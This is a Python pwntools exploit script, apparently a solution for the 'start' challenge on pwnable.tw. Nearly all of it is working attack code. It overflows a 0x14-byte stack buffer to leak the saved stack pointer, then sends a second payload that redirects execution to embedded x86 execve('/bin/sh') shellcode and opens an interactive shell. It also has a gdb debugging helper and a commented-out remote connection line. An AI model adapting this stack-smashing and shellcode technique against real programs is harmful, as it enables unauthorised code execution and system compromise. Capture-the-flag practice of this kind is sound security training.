from pwn import *
from binascii import *

# shellcode='''
# xor eax,eax
# push eax
# push %s
# push %s
# mov ebx, esp
# xor ecx,ecx
# xor edx,edx
# mov al, 0xb
# int 0x80''' %(u32('/sh\0'),u32('/bin'))
shellcode = asm('''
    push 0x0b
    pop eax
    push 0x0068732f
    push 0x6e69622f
    mov ebx, esp
    int 0x80
''')

def dbg():
    p = process('./start')
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    context.log_level = 'debug'
    gdb.attach(proc.pidof(p)[0])
    pause()
    return p

def leak_esp(p):
    start = p.recvuntil(b':')
    payload = b'a'*0x14 + p32(0x08048087)
    p.send(payload)
    saved_esp = p.recv()[:4]
    return u32(saved_esp)

def pwn(p,saved_esp):
    payload = b'a'*0x14 + p32(saved_esp + 20) + shellcode
    p.send(payload)
    p.interactive()

if __name__ == '__main__':
    # p = dbg()
    p = process("./start")
    # p = remote("chall.pwnable.tw",10000)
    saved_esp = leak_esp(p)
    print("leak saved_esp: %s" %hex(saved_esp+20))
    pwn(p,saved_esp)